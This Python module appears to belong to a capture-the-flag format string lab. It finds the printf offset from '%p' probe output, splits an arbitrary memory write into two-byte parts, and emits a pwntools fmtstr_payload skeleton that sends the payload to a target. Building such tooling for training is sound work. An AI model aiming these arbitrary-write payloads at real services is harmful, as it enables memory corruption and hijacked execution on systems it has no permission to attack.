"""Format String Lab facts (Phase 6, 规划 §二十七).

The offset finder parses probe output deterministically; the write planner
decomposes a target write into address/part pairs (provable arithmetic) and
delegates final payload math to pwntools ``fmtstr_payload`` at EXP runtime —
no fabricated padding bytes.
"""
from __future__ import annotations

from dataclasses import dataclass
import re

_HEX_OR_TEXT_RE = re.compile(r"0x[0-9a-fA-F]+")


def find_fmt_offset(probe_output: str, *, marker: int = 0x41414141, bits: int = 64) -> int | None:
    """Locate the printf argument index whose value contains the marker.

    The classic probe is ``AAAAAAAA`` (0x41414141…) followed by ``%p`` repeats.
    Returns the 1-based format position, or None when the marker is absent —
    absence is not an offset.
    """
    if bits == 64:
        # "AAAAAAAA" reads back as 0x4141414141414141: match either half-word
        # half of the qword depending on the probe's alignment.
        def _is_marker(value: int) -> bool:
            return (value & 0xFFFFFFFF) == marker or (value >> 32) == marker
    else:
        def _is_marker(value: int) -> bool:
            return (value & 0xFFFFFFFF) == marker
    for index, token in enumerate(_HEX_OR_TEXT_RE.findall(str(probe_output)), start=1):
        try:
            value = int(token, 16)
        except ValueError:
            continue
        if _is_marker(value):
            return index
    return None


@dataclass(frozen=True)
class FmtWritePlan:
    target: int
    value: int
    parts: tuple[tuple[int, int], ...]
    bits: int

    @property
    def write_size(self) -> str:
        return "short" if self.bits >= 16 else "byte"

    def to_dict(self) -> dict[str, object]:
        return {
            "target": self.target,
            "value": self.value,
            "parts": [{"address": f"{address:#x}", "value": f"{part:#x}"} for address, part in self.parts],
            "bits": self.bits,
            "write_size": self.write_size,
        }


def plan_fmt_writes(target: int, value: int, *, bits: int = 64) -> FmtWritePlan:
    """Split one arbitrary write into two-byte address/part pairs.

    The decomposition is plain arithmetic on the value; ordering goes low
    half-word first.  Negative or oversized targets are rejected instead of
    being silently wrapped.
    """
    target = int(target)
    value = int(value)
    if target < 0:
        raise ValueError("目标地址不能为负")
    width = bits // 8
    if not 0 <= value < (1 << (width * 8)):
        raise ValueError(f"写入值超出 {bits} 位范围")
    parts: list[tuple[int, int]] = []
    mask = 0xFFFF
    for shift in range(0, width * 8, 16):
        part = (value >> shift) & mask
        if part == 0 and width == 8 and value < (1 << 32):
            # A zero high half on a small 64-bit value still needs the write
            # when the target previously held data; keep it explicit.
            parts.append((target + shift // 8, part))
            continue
        parts.append((target + shift // 8, part))
    return FmtWritePlan(target, value, tuple(parts), bits)


def to_pwntools(plan: FmtWritePlan, *, offset: int = 6) -> str:
    """Emit a pwntools skeleton; padding math is fmtstr_payload's job."""
    lines = [
        f"# fmt write plan: {plan.target:#x} <- {plan.value:#x} ({plan.bits} 位)",
        f"target = {plan.target:#x}",
        f"value = {plan.value:#x}",
        f"payload = fmtstr_payload({offset}, {{target: value}}, write_size='{plan.write_size}')",
        "# 发送方式按题目 IO 选择: io.send(payload) / io.sendline(payload)",
    ]
    return "\n".join(lines)
